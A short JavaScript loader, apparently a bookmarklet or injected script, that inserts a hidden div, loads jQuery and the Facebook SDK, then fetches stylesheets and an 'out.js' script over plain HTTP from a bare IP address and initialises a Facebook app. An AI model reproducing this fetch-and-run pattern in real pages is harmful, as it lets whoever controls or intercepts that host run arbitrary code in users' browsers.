var sandbox = document.createElement('div');
sandbox.classList.add('sandbox');
sandbox.style['z-index'] = -1;
document.body.appendChild(sandbox);

var loaded = 0;
var tryRunRest = function () {
	loaded += 1;
	if (loaded === 2) {
		runRest();
	}
};

var jqScript = document.createElement('script');
jqScript.onload = tryRunRest;
jqScript.setAttribute('src', 'https://code.jquery.com/jquery-2.1.4.min.js');
document.body.appendChild(jqScript);

var script = document.createElement('script');
script.onload = tryRunRest;
script.setAttribute('src', '//connect.facebook.net/en_US/all.js');
document.body.appendChild(script);

var reset = document.createElement('link');
reset.setAttribute('rel', 'stylesheet');
reset.setAttribute('type', 'text/css');
reset.setAttribute('href', 'http://71.89.76.184/css/resetEl.css');
document.body.appendChild(reset);

var fa = document.createElement('link');
fa.setAttribute('rel', 'stylesheet');
fa.setAttribute('type', 'text/css');
fa.setAttribute('href', 'http://71.89.76.184/css/font-awesome.min.css');
document.body.appendChild(fa);

var runRest = function () {
	var script = document.createElement('script');
	script.setAttribute('src', 'http://71.89.76.184/out.js');
	document.body.appendChild(script);

	FB.init({
		appId : '913129392106703',
		xfbml : true,
	});
};
